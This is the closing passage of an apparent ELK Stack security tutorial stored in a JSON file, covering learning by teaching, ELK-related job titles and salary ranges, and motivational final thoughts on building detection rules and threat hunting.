Learning Principle: **Teach to Master**\n\nThe fastest way to solidify your ELK knowledge?\n\n**Teach someone else.**\n\n- Give a lunch-and-learn at your company\n- Write a blog post about ELK detection rules\n- Create a YouTube tutorial on Logstash pipelines\n- Mentor a junior analyst\n\nWhen you teach, you'll discover gaps in your understanding. Filling those gaps = true mastery.\n\n## The Job Market Reality\n\n**ELK Skills Are Highly Valued:**\n\n- **SOC Analyst (ELK experience)**: $70K-$90K\n- **Detection Engineer (ELK)**: $100K-$130K\n- **SIEM Architect (ELK)**: $130K-$180K\n- **Elastic Consultant**: $150K-$200K+\n\n**Job Postings Requiring ELK:**\n- Indeed: 15,000+ jobs mentioning \"ELK\" or \"Elasticsearch\"\n- LinkedIn: 10,000+ jobs requiring \"Kibana\"\n\n**Your Competitive Advantage**: Most analysts know *how to use* Kibana. You know *how to build* detection rules, optimize clusters, and design architectures.\n\n## Final Thoughts\n\nELK Stack is not just a tool - it's a **security engineering platform**.\n\n**Old Security**: Buy expensive SIEM, hope vendor detections work\n\n**New Security**: Build custom detection logic, own your data, adapt to threats\n\nYou now have the skills to:\n- Detect APT attacks before they cause damage\n- Hunt threats across thousands of endpoints\n- Respond to incidents in minutes, not days\n- Prove security value with metrics and dashboards\n\n**The Question Is**: What will you build first?\n\nGo forth and hunt threats at scale. üîçüìä"
      }
    }
  ]
}